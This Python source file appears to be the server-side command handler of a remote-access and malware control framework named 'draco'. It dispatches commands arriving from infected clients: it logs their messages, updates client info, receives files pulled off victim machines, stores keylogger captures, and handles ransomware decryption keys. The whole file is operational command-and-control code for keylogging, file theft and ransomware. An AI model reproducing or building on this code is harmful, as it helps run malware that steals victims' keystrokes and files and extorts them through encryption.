
from app.conn.servers.packer import Packer
from app.storage.key_store import KeyStorage



class ServerControler:
    def __init__(self, draco: object):
        self.draco = draco
        self.msg = self.draco.msg
        self.keylogger = KeyStorage(self.draco)
    
    def check_cmd(self, cmd: list, handler:object) -> None:
        for command in cmd:
            self._check_cmd(command, handler)

    def _check_cmd(self, cmd: dict, handler: object) -> None:
        self.msg("dev", str(cmd), sender=handler.client)
        if not isinstance(cmd, dict):
            types = None
        else:
            types = cmd.get("types")
        if not types:
            self.msg("no_imp", "Client send unknown command", sender=handler.client)
            return
        match types:
            case "msg":
                self.msg("msg", f"New Messages:\n{cmd.get('data')}", sender=handler.client)
            case "info":
                self.msg("no_imp", f"Update client info")
                handler.info.update(cmd.get("data", {}))
            case "down":
                self.download_file(cmd.get("data"), handler)
            case "keyl":
                self.keylogger.update(cmd.get("data"), handler)
            case "ransk":
                self.keylogger.get_ransomware_key(str(cmd.get("data")), handler)
            case _:
                self.msg("no_imp", "Client send unknown command", sender=handler.client)

    
    def download_file(self, data: dict, handler: object) -> None:
        if not data:
            self.msg("error", f"[!!] Uncomplete download data [!!]", sender=handler.client)
        name = data.get("name")
        file_len = data.get("file_len")
        file_id = data.get("file_id")
        types = data.get("types")
        self.msg("no-imp", f"Start Download File: '{name}'", sender=handler.client)
        pack = Packer(self.draco, handler)
        pack.set_opt(file_id, name, file_len, types)
        pack.start()
    
